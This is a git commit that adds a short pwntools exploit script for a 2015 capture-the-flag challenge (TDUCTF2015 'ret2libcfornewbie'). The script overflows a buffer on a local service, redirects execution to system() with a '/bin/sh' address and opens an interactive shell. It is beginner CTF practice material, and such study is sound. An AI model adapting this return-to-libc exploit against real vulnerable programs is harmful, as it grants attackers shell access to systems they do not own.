3507362c34c97a2cb9bae55fdad07a6466d85975
tkmru <i.am.tkmru@gmail.com>
2015-10-05 23:05:51 +0900

    add ret2libcfornewbie

---
+++ TDUCTF2015/ret2libcfornewbie.py
@@ -0,0 +1,18 @@
+# coding: UTF-8
+
+from pwn import *
+
+r = remote('localhost', 10170)
+elf = ELF('r2lfn')
+system_plt = 0x8048410
+
+'''
+(gdb) find &main,+999,"/bin/sh"
+0x80486ad
+1 pattern found.
+'''
+binsh = 0x80486ad
+
+r.send('A' * 16 + p32(elf.plt['system']) + 'BBBB' + p32(binsh))
+
+r.interactive()
